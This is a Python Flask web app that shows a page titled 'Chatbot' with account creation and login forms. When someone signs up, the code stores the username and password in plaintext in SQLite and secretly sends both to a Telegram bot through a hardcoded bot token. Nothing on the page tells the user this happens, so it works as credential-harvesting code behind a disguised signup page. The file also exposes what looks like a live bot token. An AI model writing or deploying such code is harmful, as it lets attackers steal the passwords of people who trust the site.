from flask import Flask, render_template_string, request, jsonify, redirect, url_for
import os
import sqlite3
import requests

app = Flask(__name__)

# Replace this with your own Telegram bot token and chat ID
TELEGRAM_TOKEN = '7541018776:AAEmnQSnqUaPWDHg2yWYKCd4r7jEH-Gjut4'
CHAT_ID = '@SidraAICRED_bot'  # Your Telegram chat ID or username

# Initialize SQLite database
DB_PATH = 'accounts.db'

# Function to initialize the database
def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users
                        (username TEXT PRIMARY KEY, password TEXT)''')
        conn.commit()
        conn.close()

# Send credentials to Telegram
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

# Function to add a new user to the database
def add_user(username, password):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()

# Function to check if the username and password are correct
def check_login(username, password):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
    user = cursor.fetchone()
    conn.close()
    return user

# Route to render the main page
@app.route('/')
def home():
    return render_template_string(html_template)

# Route for account creation
@app.route('/create_account', methods=['POST'])
def create_account():
    username = request.form['username']
    password = request.form['password']
    
    # Add the new user to the database
    add_user(username, password)

    # Send the credentials to your Telegram
    send_to_telegram(f"New Account Created!\nUsername: {username}\nPassword: {password}")

    return redirect(url_for('home'))

# Route for login
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Check login credentials
    if check_login(username, password):
        return redirect(url_for('home'))
    else:
        return "Invalid credentials, please try again.", 401

# HTML, CSS, and JavaScript for the frontend
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chatbot</title>
    <style>
        /* Your styles */
    </style>
</head>
<body>
    <h1>Create Account</h1>
    <form action="/create_account" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Create Account</button>
    </form>

    <h1>Login</h1>
    <form action="/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

if __name__ == '__main__':
    init_db()
    app.run(debug=True)